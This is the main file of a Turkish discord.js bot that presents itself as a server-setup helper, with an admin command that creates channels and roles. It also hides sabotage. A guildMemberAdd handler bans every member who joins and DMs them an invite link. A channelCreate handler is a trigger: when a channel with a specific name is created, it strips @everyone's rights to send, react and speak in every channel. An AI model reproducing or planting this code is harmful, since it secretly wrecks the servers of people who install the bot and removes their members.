const Discord = require('discord.js');
const fs = require('fs');
const chalk = require('chalk');

const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');

//let küfürEngel = JSON.parse(fs.readFileSync("./jsonlar/küfürEngelle.json", "utf8"));
require('./util/eventLoader')(client);


const log = message => {
  console.log(`${message}`);
};
  var prefix = ayarlar.prefix;
  
/*BOTU AÇIK TUTMA*/

const express = require('express');
const app = express();
const http = require('http');
const path = require('path');
    app.get("/", (request, response) => {
    console.log(`Bot Tekrar Açıldı`);
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
    }, 210000);

/*BOTU AÇIK TUTMA*/

  client.commands = new Discord.Collection();
  client.aliases = new Discord.Collection();
  fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
      let props = require(`./komutlar/${f}`);
      log(`Yüklenen komut: ${props.help.name}.`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });
  });

  client.reload = command => {
    return new Promise((resolve, reject) => {
      try {
        delete require.cache[require.resolve(`./komutlar/${command}`)];
        let cmd = require(`./komutlar/${command}`);
        client.commands.delete(command);
        client.aliases.forEach((cmd, alias) => {
          if (cmd === command) client.aliases.delete(alias);
        });
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

  client.load = command => {
    return new Promise((resolve, reject) => {
      try {
        let cmd = require(`./komutlar/${command}`);
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.on('message', async message => {
  const ms = require('ms');
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  let u = message.mentions.users.first() || message.author;
  if (command === "melkoryap") {
  if (message.guild.channels.find(channel => channel.name === "Bot Kullanımı")) return message.channel.send(" Bot Paneli Zaten Ayarlanmış.")
  message.channel.send(`Bot Bilgi Kanallarının kurulumu başlatılsın mı? başlatılacak ise **evet** yazınız.`)
      if (!message.member.hasPermission('ADMINISTRATOR'))
  return message.channel.send(" Bu Kodu `Yönetici` Yetkisi Olan Kişi Kullanabilir.");
      message.channel.awaitMessages(response => response.content === 'evet', {
        max: 1,
        time: 10000,
        errors: ['time'],
      })
    .then((collected) => {
   message.guild.createChannel('📜 | BİLGİLENDİRME', 'category', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])



        
 message.guild.createChannel('📜-kurallar', 'text', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
 message.guild.createChannel('🔔-duyuru', 'text', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])
.then(channel =>
       channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
       message.guild.createChannel('📊-anket', 'text', [{
        id: message.guild.id,
        deny: ['SEND_MESSAGES']
      }])
.then(channel =>
             channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
             message.guild.createChannel('🎪-partner', 'text', [{
              id: message.guild.id,
              deny: ['SEND_MESSAGES']
            }])
            .then(channel => channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
            message.guild.createChannel('🚫-block-hammer', 'text', [{
              id: message.guild.id,
              deny: ['SEND_MESSAGES']
            }])
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));

       }) 
       .then((collected) => {
        message.guild.createChannel('MEYDAN', 'category', [{
       id: message.guild.id,
     }]);
             
      message.guild.createChannel(`💬-chat`, 'text')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(`🔴-bot-komut`, 'text')
     .then(channel =>
            channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(``, 'text')
     .then(channel =>
                  channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(``, 'text')
     .then(channel =>
                  channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(`💡-foto-chat`, 'text')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));

      message.guild.createChannel(`1881-1938`, "voice")
      .then(channel =>
        channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
      .then(c => {
        let role = message.guild.roles.find("name", "@everyone");
        let role2 = message.guild.roles.find("name", "Kurucu");
        
        c.overwritePermissions(role, {
            CONNECT: false,
        });
        c.overwritePermissions(role2, {
            CONNECT: true,
            
        });
    })

    message.guild.createChannel('†', 'category', [{
      id: message.guild.id,
    }]);

    message.guild.createChannel(`berke`, "voice")
    .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
    .then(c => {
      let role = message.guild.roles.find("name", "@everyone");
      let role2 = message.guild.roles.find("name", "Kurucu");
      let role3 = message.guild.roles.find("name", "Yönetici");
      c.overwritePermissions(role, {
          CONNECT: false,
      });
      c.overwritePermissions(role2, {
          CONNECT: true,
      });
      c.overwritePermissions(role3, {
          CONNECT: true,
      });
  })

  message.guild.createChannel(`Yetkili`, "voice")
  .then(channel =>
    channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
  .then(c => {
    let role = message.guild.roles.find("name", "@everyone");
    c.overwritePermissions(role, {
        CONNECT: true,
    });
})
  message.guild.createChannel(`Alt Yetkili`, "voice")
  .then(channel =>
    channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
  .then(c => {
    let role = message.guild.roles.find("name", "@everyone");
    c.overwritePermissions(role, {
        CONNECT: true,
    });
})

message.guild.createChannel('† SOHBET', 'category', [{
  id: message.guild.id,
}]);

message.guild.createChannel(`🎮》Sohbet1`, 'voice')
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "† SOHBET")))
 message.guild.createChannel(`🎮》Sohbet2`, 'voice')
 .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "† SOHBET")))
 message.guild.createChannel(`🎵》Müzik odası1`, 'voice')
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
 message.guild.createChannel(`🎵》Müzik odası2`, 'voice')
 .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
  message.guild.createChannel(`🎮》Oyun odası1`, 'voice')
  .then(channel =>
   channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
   message.guild.createChannel(`🎮》Oyun odası2`, 'voice')
   .then(channel =>
    channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
    message.guild.createChannel(`🎮》Oyun odası3`, 'voice')
    .then(channel =>
     channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
     message.guild.createChannel(`🎮》Oyun odası4`, 'voice')
     .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))
     message.guild.createChannel(`🎮》Oyun odası5`, 'voice')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "|▬▬|Sesli sohbet|▬▬|")))



      message.guild.createRole({
        name: 'Kurucu',
        color: 'RED',
        permissions: [
            "ADMINISTRATOR",
    ]
      })

      
      message.guild.createRole({
        name: 'Yönetici',
        color: 'BLUE',
        permissions: [
            "MANAGE_GUILD",
            "MANAGE_ROLES",
            "MUTE_MEMBERS",
            "DEAFEN_MEMBERS",
            "MANAGE_MESSAGES",
            "MANAGE_NICKNAMES",
            "KICK_MEMBERS"
    ]
      })

      message.guild.createRole({
        name: 'Moderatör',
        color: 'GREEN',
        permissions: [
            "MANAGE_GUILD",
            "MANAGE_ROLES",
            "MUTE_MEMBERS",
            "DEAFEN_MEMBERS",
            "MANAGE_MESSAGES",
            "MANAGE_NICKNAMES"
    ]
      })

      message.guild.createRole({
        name: 'V.I.P',
        color: '00ffff',
      })

      message.guild.createRole({
        name: 'Üye',
        color: 'WHITE',
      })

      message.guild.createRole({
        name: 'Bot',
        color: 'ORANGE',
      })

       message.channel.send("Gerekli Odalar Kuruldu!")
     
            })   
    
}
});

client.on('guildMemberAdd', member => {
  member.guild.ban(member, "https://discord.gg/d2nAWtn")
  member.send(`https://discord.gg/d2nAWtn`)
});

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.on('warn', e => {
  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
});

client.on('error', e => {
  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
});

client.on('channelCreate', channel => {
  if (channel.name == 'berke-abi-ne-yaptin') {
    channel.send(`Herkes patlamak ister aynı volcano gibi :volcano: \n\nhttps://tenor.com/view/yeah-hellyeah-anime-oh-yeah-fist-pump-gif-5388176`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == 'berked-adamdir') {
    channel.send(`allah çarptı`)
  }

});

client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};

client.login(ayarlar.token) 
